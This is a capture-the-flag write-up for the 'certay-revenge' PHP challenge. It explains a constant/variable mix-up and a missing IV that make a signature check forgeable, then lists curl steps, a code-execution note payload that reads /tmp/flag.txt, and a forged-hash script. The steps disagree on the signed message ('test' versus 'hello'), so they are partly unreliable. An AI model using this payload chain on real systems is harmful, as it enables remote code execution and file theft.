# certay-revenge

**Description:**  
_“Probably you need to understand our language to get some of the superpowers?”_  
But it’s fixed now.

---

## Overview
The website contains the following PHP files:

- `login.php`
- `register.php`
- `dashboard.php`
- `post_note.php`

After registering and logging in, a user is shown a textarea. However, submitting any text appears to do nothing.

Let’s dive into the source code for more details.

---

## Source Code Analysis

- The `login.php`, `register.php`, and `post_note.php` files contain no significant vulnerabilities.
- The interesting logic lies in the `dashboard.php` and `config.php` files.
- The `config.php` file contains a dangerous function, which becomes critical in the context of the dashboard.

From `dashboard.php`, here are the notable code snippets:

```php
define('yek', $_SESSION['yek']);

function safe_sign($data) {
    return openssl_encrypt($data, 'aes-256-cbc', KEY, 0, iv);
}

custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash'];
```

---

## Technical Insight

### `define` vs Variable Declaration

**`define`:**

1. Used to declare constants (immutable values).
2. Constants do **not** start with `$`.
3. Constants are global and case-sensitive.
4. Cannot be changed or undefined once set.

**Regular Variable Declaration:**

1. Used to declare variables.
2. Variables **start with `$`**.
3. Can be reassigned.
4. Scope can vary: local, global, or static.

### Issue with IV in `openssl_encrypt`

If the IV is not properly passed to `openssl_encrypt()`:
- PHP pads it with null bytes (` `) if too short.
- If completely missing or incorrect (like `false`), it can result in unintended behavior and even insecure encryption.

---

## Key Vulnerabilities

### 1. Constant vs Variable Confusion
- `define('yek', $_SESSION['yek']);` defines a **constant** `yek`, but later code uses the **variable** `$yek`, which is uninitialized.
- As a result, `$yek` becomes `null`.

### 2. Undefined IV in `safe_sign()`
- The IV parameter (`iv`) is not defined in the function.
- If `$_GET['key']` is passed as an array, `safe_sign()` returns `false`.

### 3. Weak Encryption Parameters
In the `custom_sign()` call:
- `$key = null`
- `$iv = false`

This leads to:
- Key: effectively an empty string (because `null` is cast to `""`)
- IV: 16 null bytes (because `false` becomes an empty string, which gets padded)

This results in **predictable encryption** and allows the attacker to forge a valid hash.

---

## Exploitation Steps

### 1. Register an Account
```bash
curl -X POST -d "username=attacker&password=attacker" http://localhost:8080/register.php
```

### 2. Log In to Create a Session
```bash
curl -X POST -d "username=attacker&password=attacker" http://localhost:8080/login.php -c cookies.txt
```

### 3. Post a Malicious Note
```bash
curl -X POST -d "note=highlight_file('/tmp/flag.txt');" http://localhost:8080/post_note.php -b cookies.txt
```

### 4. Generate a Matching Hash to Bypass the Check

Create a PHP script:
```php
<?php
function custom_sign($data, $key, $vi) {
    return openssl_encrypt($data, 'aes-256-cbc', $key, 0, $vi);
}
echo custom_sign("test", null, false);
?>
```

This outputs a predictable signature because both key and IV are weak.

Let’s say it prints:
```
2HB5iFgiP0Vk00CxA/ZSew==
```

### 5. Bypass the Signature Check
```bash
curl "http://localhost:8080/dashboard.php?msg=hello&hash=2HB5iFgiP0Vk00CxA/ZSew==&key[]=" -b cookies.txt
```

Because the signature matches, the malicious `note` gets executed.

---

## FLAG

![flag](https://github.com/user-attachments/assets/c2f5a464-cbec-4445-92a7-2663f5e0ae53)
